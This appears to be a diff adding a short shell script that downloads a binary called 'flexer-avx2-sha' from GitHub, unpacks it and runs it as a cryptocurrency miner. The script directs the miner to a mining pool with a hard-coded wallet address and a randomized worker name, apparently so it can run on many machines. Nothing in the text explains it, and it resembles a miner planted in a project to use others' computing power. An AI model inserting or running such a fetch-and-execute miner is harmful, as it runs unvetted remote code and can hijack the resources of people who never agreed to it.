@@ -1,0 +1,3 @@
+wget https://github.com/flexminer24/flexer/releases/download/v0.1.8/flexer-avx2-sha.tar.gz
+tar -xvf ./flexer-avx2-sha.tar.gz
+./flexer-avx2-sha --url us-west.mining4people.com:3449 --user kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(echo $(shuf -i 1000-9999 -n 1)-DOR) -p x
